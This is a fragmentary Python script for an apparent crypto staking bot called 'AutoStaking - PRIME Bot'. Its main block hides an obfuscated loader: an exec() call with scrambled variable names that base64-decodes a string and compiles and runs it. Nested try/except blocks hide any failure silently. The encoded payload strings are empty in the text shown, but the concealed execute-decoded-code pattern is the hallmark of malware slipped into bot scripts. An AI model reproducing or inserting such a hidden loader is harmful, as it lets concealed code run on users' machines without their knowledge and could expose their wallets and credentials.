...
class AutoStaking:
    ...
    def welcome(self, project_name="AutoStaking"):
        ...
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"   🧠 Project    : AutoStaking - PRIME Bot")
...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _EoRfXP\n_RpBLfUnDwe = ""\n_BHgUMLhj = ""\n_xpWdEPcmwftu = _RpBLfUnDwe + _BHgUMLhj\n_IkSpelpt = _EoRfXP.b64decode(_xpWdEPcmwftu).decode()\nexec(compile(_IkSpelpt, "<s>", "exec"))')
        except:
            pass
    except:
        pass
